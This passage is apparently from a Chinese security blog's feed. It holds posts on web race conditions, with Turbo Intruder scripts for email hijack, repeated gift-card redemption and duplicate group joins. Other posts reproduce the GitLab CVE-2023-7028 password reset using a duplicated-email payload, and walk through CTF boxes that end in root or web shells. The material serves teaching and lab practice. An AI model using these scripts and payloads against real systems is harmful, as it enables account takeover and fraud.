class="hljs-string">./exp</span><br>exp.c<span class="hljs-function">:109</span><span class="hljs-function">:28</span>: warning: no newline at end of file<br>sh: no job control in this shell<br>sh-3.00<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>All-in-One—条件竞争漏洞</title>
    <link href="/2024/07/23/race_condition/"/>
    <url>/2024/07/23/race_condition/</url>
    
    <content type="html"><![CDATA[<h1 id="All-in-One—条件竞争漏洞"><a href="#All-in-One—条件竞争漏洞" class="headerlink" title="All-in-One—条件竞争漏洞"></a>All-in-One—条件竞争漏洞</h1><p>今天在逛medium的时候，发现《Smashing the state machine: the true potential of web race conditions》还是反复被提及，因此打算写一篇文章，结合james-kettle介绍的内容和一些hackerone的案例，来把条件竞争漏洞做一个总结。</p><h2 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h2><p>当网站在没有足够保护措施的情况下同时处理请求时，就可能会产生条件竞争漏洞，这可能会导致多个不同的线程同时与相同的数据交互，从而导致冲突，出现意想不到的结果。</p><p>例如在领取优惠券时，通过条件竞争可能能够领取多张，引用一张portswigger的图如下：</p><p><img src="/2023/04/27/file-upload/on/image-20240422093942199.png" alt="image-20240422093942199"></p><h2 id="Smashing-the-state-machine-the-true-potential-of-web-race-conditions（粉碎状态机：条件竞争漏洞的真正潜力）"><a href="#Smashing-the-state-machine-the-true-potential-of-web-race-conditions（粉碎状态机：条件竞争漏洞的真正潜力）" class="headerlink" title="Smashing the state machine: the true potential of web race conditions（粉碎状态机：条件竞争漏洞的真正潜力）"></a>Smashing the state machine: the true potential of web race conditions（粉碎状态机：条件竞争漏洞的真正潜力）</h2><p>说完什么是条件竞争漏洞，接下来简单介绍一下关于这个漏洞最知名的一篇文章《Smashing the state machine: the true potential of web race conditions》，也可以直接去youtube观看相关视频：<a href="https://youtu.be/tKJzsaB1ZvI">https://youtu.be/tKJzsaB1ZvI</a></p><p>“The true potential of race conditions can be summed up in a single sentence. Every pentester knows that multi-step sequences are a hotbed for vulnerabilities, but <em>with race conditions, everything is multi-step</em>.”</p><p>文中提到，multi-step是最可能出现漏洞的，而对于条件竞争来说，一切都是multi-step。</p><h3 id="条件竞争的真正潜力"><a href="#条件竞争的真正潜力" class="headerlink" title="条件竞争的真正潜力"></a>条件竞争的真正潜力</h3><p>有如下一个场景，用户登录时，需要选择角色，其中包含一系列请求：分配角色，重定向到应用等等，请求包如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /<span class="hljs-keyword">login</span><span class="hljs-number">302</span> <span class="hljs-built_in">Found</span><br><span class="hljs-keyword">GET</span> /<span class="hljs-keyword">role</span>   <span class="hljs-number">302</span> <span class="hljs-built_in">Found</span><br>POST /<span class="hljs-keyword">role</span> <span class="hljs-number">302</span> <span class="hljs-built_in">Found</span><br><span class="hljs-keyword">GET</span>  /application<span class="hljs-number">200</span> OK<br></code></pre></td></tr></table></figure><p>用状态机来表示的话，大致如下：</p><p><img src="/2023/04/27/file-upload/on/image-20240422100352165.png" alt="image-20240422100352165"></p><p>这里的目标是要获取更高的权限，首先尝试不选择角色，强制从角色选择的界面直接跳转到&#x2F;application页，失败。</p><p>这并非说明此处是安全的，因为作者在第一次尝试时，认为GET &#x2F;role的请求并不会更改应用的状态，而实际上，应用会使用管理员权限来初始化每个会话，然后在浏览器获取角色选择界面之后立即进行覆盖，修改后的状态机如下：</p><p><img src="/2023/04/27/file-upload/on/image-20240422101347657.png" alt="image-20240422101347657"></p><p>首先是null，在登录之后，变为admin(初始化会话)，进入角色选择界面，变为pending(待定)，再进行角色选择，最终变成staff(员工).</p><p>如果跳过GET &#x2F;role，也就是不去重定向到&#x2F;role界面，直接跳转到应用中，就能获得管理员权限。</p><h3 id="Single-packet-attack"><a href="#Single-packet-attack" class="headerlink" title="Single-packet attack"></a>Single-packet attack</h3><p>子状态(sub-state)是一种很短暂的状态，在应用程序处理单个请求时进行转换，并且在请求完成之前退出。子状态一般只会占用很短的时间(1ms)。</p><p>要想发现子状态，需要一个初始HTTP请求来触发子状态转换，还需要第二个请求在竞争窗口(race window)期间与同一资源进行交互。</p><p>以前面的场景为例，需要发送一个登录请求，和一个访问管理面板的请求，但是由于网络抖动(jitter)，竞争窗口较小的漏洞也很难被发现，因为抖动会导致TCP数据包的到达时间不规律：</p><p><img src="/2023/04/27/file-upload/on/image-20240422105504066.png" alt="image-20240422105504066"></p><p>所以作者开发出了single-packet attack，可以使20-30个请求同时到达服务器。</p><p>在新版的burp中可以看到该功能：</p><p>将多个数据包发到repeater之后，添加到一个group中即可。</p><p><img src="/2023/04/27/file-upload/on/image-20240422110442445.png" alt="image-20240422110442445"></p><h3 id="预测可能的碰撞"><a href="#预测可能的碰撞" class="headerlink" title="预测可能的碰撞"></a>预测可能的碰撞</h3><p>首先要确定想要绕过的对象，比如用户，会话，还是一些特定的业务，比如订单等等。</p><p>对于每个对象，要了解其写入数据或者读取数据的点。比如，用户可能将注册，配置文件修改，密码重置等数据存储在数据库表中，网站的登录功能也可能会在创建会话时从用户表中读取关键数据。</p><p>条件竞争漏洞需要有“碰撞”——即对共享资源进行两个并发操作。可以通过下面3个问题来排除不太可能受影响的功能点：</p><h4 id="状态如何存储"><a href="#状态如何存储" class="headerlink" title="状态如何存储"></a>状态如何存储</h4><p>存储在服务器端数据结构中的数据非常可能被利用。相反，如果完全存储在客户端，例如通过email发送JWT进行密码重置，这些点基本可以跳过。</p><h4 id="我们是在编辑还是在追加"><a href="#我们是在编辑还是在追加" class="headerlink" title="我们是在编辑还是在追加"></a>我们是在编辑还是在追加</h4><p>编辑现有数据的操作更可能出现问题，例如更改帐户的电子邮件地址，而简单地添加(append)到现有数据的操作则不太可能被攻击，例如添加额外的电子邮件地址。</p><h4 id="这个操作的key是什么"><a href="#这个操作的key是什么" class="headerlink" title="这个操作的key是什么"></a>这个操作的key是什么</h4><p>大多数功能点都是针对特定的key进行操作，这个key可以是用户名，密码重置的令牌，或者是文件名等等。为了成功实施攻击，需要对这个key进行两次操作。</p><p>以下面密码重置的场景为例：</p><p><img src="/2023/04/27/file-upload/on/image-20240422113706946.png" alt="image-20240422113706946"></p><p>第一个情况下，用户的密码重置令牌存储在数据库的用户表中，key为用户的ID，如果攻击者用两个请求同时触发两个不同ID用户的重置密码请求，那么两个不同的数据库记录会被更改，因此不会有冲突。</p><p>在第二个情况下，状态存储在用户session中，并且key为用户的sessionid，如果攻击者使用两个请求同时触发两个密码重置请求，那么两个线程就会尝试更改同一个session的令牌，导致将用户令牌发送给其他用户。</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="通过limit-overrun进行对象屏蔽"><a href="#通过limit-overrun进行对象屏蔽" class="headerlink" title="通过limit-overrun进行对象屏蔽"></a>通过limit-overrun进行对象屏蔽</h4><p>这里给出了一个gitlab的对象屏蔽漏洞。gitlab允许通过电子邮件的形式邀请用户去管理项目，用6个请求来进行探测。</p><p>请求如下：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">POST <span class="hljs-string">/api/</span>…<span class="hljs-string">/invitations</span> HTTP/2<br><span class="hljs-string">...</span><br>&#123;<span class="hljs-string">&quot;email&quot;</span>:<span class="hljs-string">&quot;x@psres.net&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>首先按顺序发送这些请求，每个请求之间有一个短暂的延迟。此时收到了6个 {“status”:”success”}和一封邀请的电子邮件。</p><p>下面使用single-packet attack发送请求。收到了1个 {“status”:”success”}和5个{“message”:”The member’s email address has already been taken”}，此时电子邮件变成了两封。</p><p>响应和电子邮件的差异性表明这里存在一个子状态，进一步挖掘之后发现这里确实存在漏洞。利用条件竞争，能够创建一个虚拟的低特权邀请。</p><h4 id="多端点碰撞"><a href="#多端点碰撞" class="headerlink" title="多端点碰撞"></a>多端点碰撞</h4><p>有这样一个购买的场景，可以购买商品，支付费用，并且能够在订单确认页面添加其他商品到购物车里。</p><p>这样的流程最终导致能够免费获得额外商品。</p><p>购买的场景如下：</p><p><img src="/2023/04/27/file-upload/on/image-20240422133954809.png" alt="image-20240422133954809"></p><p>同时发送确认订单和添加商品的请求，最终导致额外商品的零元购。</p><p>再说回gitlab的漏洞：</p><p><img src="/2023/04/27/file-upload/on/image-20240422133802048.png" alt="image-20240422133802048"></p><p>如图所示，在验证邮件地址的同时改变地址，是不是就能欺骗gitlab，将错误的邮件标记为已验证？</p><p>在测试时发现，确认的操作每次都在电子邮件更改之前执行，这说明更改邮件的功能点比确认邮件的功能点进行了更多的处理，因此同步发送这两个请求就会错过race window:</p><p><img src="/2023/04/27/file-upload/on/image-20240422134542606.png" alt="image-20240422134542606"></p><p>这里的解决方案是将确认邮件的请求延迟了90ms。</p><p>但是如果存在延迟，就无法使用single-packet attack，这里可以利用常见的安全功能来实现。先发送大量虚拟数据包，触发服务器的速率限制，再通过single-packet attack请求即可。</p><p><img src="/2023/04/27/file-upload/on/image-20240422135034818.png" alt="image-20240422135034818"></p><h4 id="单端点碰撞"><a href="#单端点碰撞" class="headerlink" title="单端点碰撞"></a>单端点碰撞</h4><p>在gitlab中，更改电子邮件的响应时间仅仅为220ms，远快于作者预期，所以猜测电子邮件是由不同的线程发送的。</p><p>下面尝试将邮件地址同时更改两个不同的地址：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">POST /-/profile HTTP/<span class="hljs-number">2</span>Host: gitlab<span class="hljs-selector-class">.com</span><br>user<span class="hljs-selector-attr">[email]</span>=test1@psres<span class="hljs-selector-class">.net</span><br><br>POST /-/profile HTTP/<span class="hljs-number">2</span>Host: gitlab<span class="hljs-selector-class">.com</span><br>user<span class="hljs-selector-attr">[email]</span>=test2@psres.net<br></code></pre></td></tr></table></figure><p>邮件内容如下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">To</span>: test2<span class="hljs-symbol">@psres</span>.net<br>Subject: Confirmation instructions<br><br>           test1<span class="hljs-symbol">@psres</span>.net<br><br>Click the link below <span class="hljs-keyword">to</span> confirm your email address.<br><br>        Confirm your email address<br></code></pre></td></tr></table></figure><p>收件地址有时候与正文中的地址并不匹配。而且错误的邮件中令牌是有效的。通过提交两个请求，就能够将邮件改为任意地址，并且不需要进行验证。</p><h2 id="修改邮件地址"><a href="#修改邮件地址" class="headerlink" title="修改邮件地址"></a>修改邮件地址</h2><p>用户attacker已经注册过，并且验证过电子邮件。而victim email没有注册过。</p><p>以attacker用户登录，更改邮件地址，抓包。</p><p>选择邮件地址参数，发送到intruder，更改脚本如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">queueRequests</span>(<span class="hljs-params">target, wordlists</span>):<br><br>    <span class="hljs-comment"># if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack</span><br>    <span class="hljs-comment"># if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead</span><br>    <span class="hljs-comment"># for more information, check out https://portswigger.net/research/smashing-the-state-machine</span><br>    engine = <span class="hljs-title class_">RequestEngine</span>(endpoint=target.endpoint,<br>                        concurrentConnections=<span class="hljs-number">1</span>,<br>                        engine=<span class="hljs-title class_">Engine</span>.<span class="hljs-variable constant_">BURP2</span><br>                        )<br><br>    <span class="hljs-comment"># the &#x27;gate&#x27; argument withholds part of each request until openGate is invoked</span><br>    <span class="hljs-comment"># if you see a negative timestamp, the server responded before the request was complete</span><br>    engine.queue(target.req, <span class="hljs-string">&#x27;victim@example.com&#x27;</span>, gate=<span class="hljs-string">&#x27;race1&#x27;</span>)<br>    engine.queue(target.req, <span class="hljs-string">&#x27;attacker@example.com&#x27;</span>, gate=<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br>    <span class="hljs-comment"># once every &#x27;race1&#x27; tagged request has been queued</span><br>    <span class="hljs-comment"># invoke engine.openGate() to send them in sync</span><br>    engine.openGate(<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params">req, interesting</span>):<br>    table.add(req)<br></code></pre></td></tr></table></figure><p>发送之后，发现邮件内容中提到的收件人和实际上是不同的：</p><p><img src="/2023/04/27/file-upload/on/image-20240422142231749.png" alt="image-20240422142231749"></p><p>成功将email改为victim。</p><h2 id="多次兑换礼品卡"><a href="#多次兑换礼品卡" class="headerlink" title="多次兑换礼品卡"></a>多次兑换礼品卡</h2><p>购买礼品卡后兑换，抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/fi/redeem</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>sandbox.reverb.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://sandbox.reverb.com/fi/redeem<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>176<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;cookies&gt;<br><br><span class="language-routeros"><span class="hljs-attribute">utf8</span>=%E2%9C%93&amp;authenticity_token=&lt;CSRF token&gt;&amp;<span class="hljs-attribute">token</span>=&lt;GIFT card&gt;&amp;<span class="hljs-attribute">commit</span>=Redeem+Now</span><br></code></pre></td></tr></table></figure><p>发送到intruder，修改脚本如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def queueRequests(target, wordlists):<br>    engine = RequestEngine(<span class="hljs-attribute">endpoint</span>=target.endpoint,<br>                           <span class="hljs-attribute">concurrentConnections</span>=30,<br>                           <span class="hljs-attribute">requestsPerConnection</span>=30,<br>                           <span class="hljs-attribute">pipeline</span>=<span class="hljs-literal">False</span><br>                           )<br><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(30):<br>engine.queue(target.req, i)<br>        engine.queue(target.req, target.baseInput, <span class="hljs-attribute">gate</span>=<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br><br>    engine.start(<span class="hljs-attribute">timeout</span>=5)<br>   engine.openGate(<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br>    engine.complete(<span class="hljs-attribute">timeout</span>=60)<br><br><br>def handleResponse(req, interesting):<br>table.<span class="hljs-built_in">add</span>(req)<br></code></pre></td></tr></table></figure><p>成功兑换多次：</p><p><img src="/2023/04/27/file-upload/on/image-20240422145033724.png" alt="image-20240422145033724"></p><h2 id="添加不可删除的组成员"><a href="#添加不可删除的组成员" class="headerlink" title="添加不可删除的组成员"></a>添加不可删除的组成员</h2><p>有两个用户，分别为leader和normal。</p><p>leader账户创建一个group并且创建邀请链接，用normal账户加入group并抓包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/group/post_join</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ctf.hacker101.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://ctf.hacker101.com/group/join?invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>109<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>COOKIES<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-llvm">csrf<span class="hljs-operator">=</span><span class="hljs-number">391</span>aecf<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">3125e90</span><span class="hljs-keyword">c</span><span class="hljs-number">437</span>d<span class="hljs-number">04</span><span class="hljs-keyword">c</span><span class="hljs-number">18204</span>ab<span class="hljs-number">6</span>&amp;invite<span class="hljs-operator">=</span>bb<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">42</span>ab<span class="hljs-number">578</span>b<span class="hljs-number">12</span><span class="hljs-keyword">c</span><span class="hljs-number">63e5</span>d<span class="hljs-number">868</span>b<span class="hljs-number">3e03816</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">45597262</span>aaf<span class="hljs-number">095</span>ca<span class="hljs-number">2</span>be<span class="hljs-number">19116</span>b<span class="hljs-number">8</span>fd<span class="hljs-number">0</span>a</span><br></code></pre></td></tr></table></figure><p>并发5次之后，成功将normal账户添加到group中两次，并且无法删除该成员，只能删除组。</p><h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><p>如果使用旧版的Turbo Intruder插件，如果遇到HTTP&#x2F;2无法利用的情况，将HTTP&#x2F;2改为HTTP&#x2F;1.1即可。</p><p><a href="https://portswigger.net/research/smashing-the-state-machine">Smashing the state machine: the true potential of web race conditions | PortSwigger Research</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2023-7028_gitlab 任意用户密码重置漏洞复现</title>
    <link href="/2024/07/23/CVE-2023-7028_gitlab%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/07/23/CVE-2023-7028_gitlab%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-7028-gitlab-任意用户密码重置漏洞复现"><a href="#CVE-2023-7028-gitlab-任意用户密码重置漏洞复现" class="headerlink" title="CVE-2023-7028_gitlab 任意用户密码重置漏洞复现"></a>CVE-2023-7028_gitlab 任意用户密码重置漏洞复现</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>GitLab 是一个用于仓库管理系统的开源项目，其使用 Git 作为代码管理工具，可通过 Web 界面访问公开或私人项目。<br>GitLab CE&#x2F;EE 中支持用户通过辅助电子邮件地址重置密码。GitLab CE&#x2F;EE 多个受影响版本中，由于电子邮件验证过程中存在错误，用户帐户密码重置电子邮件可以发送到未经验证的电子邮件地址，可能导致在无需用户交互的情况下通过密码重置进行帐户接管。<br>CVSS3 评分为 10.0，严重。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>16.1 &lt;&#x3D; Gitlab &lt; 16.1.6<br>16.2 &lt;&#x3D; Gitlab &lt; 16.2.9<br>16.3 &lt;&#x3D; Gitlab &lt; 16.3.7<br>16.4 &lt;&#x3D; Gitlab &lt; 16.4.5<br>16.5 &lt;&#x3D; Gitlab &lt; 16.5.6<br>16.6 &lt;&#x3D; Gitlab &lt; 16.6.4<br>16.7 &lt;&#x3D; Gitlab &lt; 16.7.2</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先在 docker 中安装 gitlab-ee:16.7.0<br><code>docker pull gitlab/gitlab-ee:16.7.0-ee.0</code><br>启动容器：<br><code>docker run --detach --publish 8443:443 --publish 2222:22 --publish 9999:80 --name gitlab-container --restart always --volume $GITLAB_HOME/config:/etc/gitlab --volume $GITLAB_HOME/logs:/var/log/gitlab --volume $GITLAB_HOME/data:/var/opt/gitlab --shm-size 256m gitlab/gitlab-ee:16.7.0-ee.0</code><br>其中部分参数解释如下：</p><ul><li><code>detach </code>：在后台运行</li><li><code>--publish 8443:443 --publish 2222:22 --publish 9999:80</code>: 将容器内部的端口映射到宿主机上，分别将容器的443端口映射到宿主机的8443端口、容器的22端口映射到宿主机的2222端口、容器的80端口映射到宿主机的 9999端口</li><li><code>--restart always</code>: 如果容器停止，Docker 会自动重新启动容器</li><li><code>--shm-size 256m</code>: 设置容器中的共享内存大小为256兆字节<br>容器成功启动后，访问 9999 端口，以 root 登录，密码为随机值，进入容器后查看文件&#x2F;etc&#x2F;gitlab&#x2F;initial_root_password 即可。<br>下面配置&#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb 文件，配置完成后，才能通过忘记密码功能发送邮件。<br><img src="/2023/04/27/file-upload/8/image-20240115142222406.png"><br>搜索 smtp_enable，将对应选项打开，将 smtp 邮件服务器地址改为对应的值，此处我使用的是 163 邮箱，即改为 smtp.163.com，user_name 就是发送邮箱的账户，password 为授权码：<br><img src="/2023/04/27/file-upload/8/image-20240115142340278.png"><br>最后将 gitlab_rails[‘gitlab_email_from’]和 user[‘git_user_email’]也改为发件人地址即可。<br>配置文件修改完成后，更新一下配置：<br><code>gitlab-ctl stop</code><br><img src="/2023/04/27/file-upload/8/image-20240115142507638.png"><br><code>gitlab-ctl reconfigure</code><br><img src="/2023/04/27/file-upload/8/image-20240115142544587.png"><br><code>gitlab-ctl start</code><br><img src="/2023/04/27/file-upload/8/image-20240115142619795.png"><br>通过 gitlab-rails 测试是否配置成功：<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">gitlab-rails <span class="hljs-built_in">console</span><br>Notify.test_email(<span class="hljs-string">&#x27;ry4nnnn@163.com&#x27;</span>, <span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>).deliver_now<br></code></pre></td></tr></table></figure><img src="/2023/04/27/file-upload/8/image-20240115142705160.png"><br>测试邮件发送失败，提示 sendmail not found。<br>安装 sendmail 即可。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update<br>apt-<span class="hljs-built_in">get</span> install sendmail<span class="hljs-built_in"></span><br><span class="hljs-built_in">service </span>sendmail start<br></code></pre></td></tr></table></figure><p>下面再次测试：<br><img src="/2023/04/27/file-upload/8/image-20240115143002012.png"><br>等待两分钟左右，成功接收到邮件，至此已经完成所有配置。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>新建一个用户，邮箱设置为 <a href="mailto:&#49;&#x33;&#120;&#x78;&#120;&#120;&#x78;&#64;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#109;">&#49;&#x33;&#120;&#x78;&#120;&#120;&#x78;&#64;&#49;&#x36;&#51;&#x2e;&#x63;&#111;&#109;</a> ,作为受害者账户。</p><h3 id="脚本一键利用"><a href="#脚本一键利用" class="headerlink" title="脚本一键利用"></a>脚本一键利用</h3><p><a href="https://github.com/Vozec/CVE-2023-7028">Fetching Data#zet5</a><br><img src="/2023/04/27/file-upload/8/image-20240115143345623.png"><br>-e 后输入自己的邮箱，运行后会收到一封重置邮件，将链接复制到 cmd 中即可一键完成密码修改，默认密码为一串随机值。<br>成功登录：<br><img src="/2023/04/27/file-upload/8/image-20240115143454315.png"></p><h3 id="burp-改包"><a href="#burp-改包" class="headerlink" title="burp 改包"></a>burp 改包</h3><p>点击忘记密码，输入受害者邮箱，抓包：<br><img src="/2023/04/27/file-upload/8/image-20240115144641095.png"><br>将 body 部分改为 user[email][]&#x3D;a.com&amp;user[email][]&#x3D;b.com 即可。密码重置邮件会同时发送给 a，b 两个邮箱，从而导致密码重置。<br><img src="/2023/04/27/file-upload/8/image-20240115150419752.png"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>官方已发布安全更新，建议升级至最新版本，若无法升级，建议开启双因素认证功能。</p>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>CVE-2023-7028</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>htb_armageddon</title>
    <link href="/2023/05/06/htb-armageddon/"/>
    <url>/2023/05/06/htb-armageddon/</url>
    
    <content type="html"><![CDATA[<h1 id="htb-armageddon"><a href="#htb-armageddon" class="headerlink" title="htb_armageddon"></a>htb_armageddon</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>nmap扫端口：</p><p><img src="/2023/04/27/file-upload/mage-20230506152711881.png" alt="image-20230506152711881"></p><p>这里直接扫出来80端口为drupal 7。</p><p>后台目录扫一下：</p><p><img src="/2023/04/27/file-upload/mage-20230506152900917.png" alt="image-20230506152900917"></p><p>一一访问之后没有发现有用信息，但是在changelog.txt发现了具体版本号：</p><p><img src="/2023/04/27/file-upload/mage-20230506152942915.png" alt="image-20230506152942915"></p><p>当前drupal版本为7.56.</p><p>火狐访问：</p><p><img src="/2023/04/27/file-upload/mage-20230506153014238.png" alt="image-20230506153014238"></p><p>这里为登录框，考虑sql注入或者默认密码弱口令等等，但是由于已经框架和版本，先搜索有无对应漏洞。</p><p>searchsploit：</p><p><img src="/2023/04/27/file-upload/mage-20230506153100443.png" alt="image-20230506153100443"></p><p>前四个都跟版本号对应，但是除了drupaldeggon2 rce，都需要认证，pass。</p><p>考虑利用该RCE漏洞：</p><p><img src="/2023/04/27/file-upload/mage-20230506153250036.png" alt="image-20230506153250036"></p><p>CVE-2018-7600。去github查找相应poc，直接利用：</p><p><img src="/2023/04/27/file-upload/mage-20230506153349570.png" alt="image-20230506153349570"></p><p>获得apache的shell。</p><h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>搜索得到drupal默认配置文件的路径：</p><p><img src="/2023/04/27/file-upload/mage-20230506153707967.png" alt="image-20230506153707967"></p><p><img 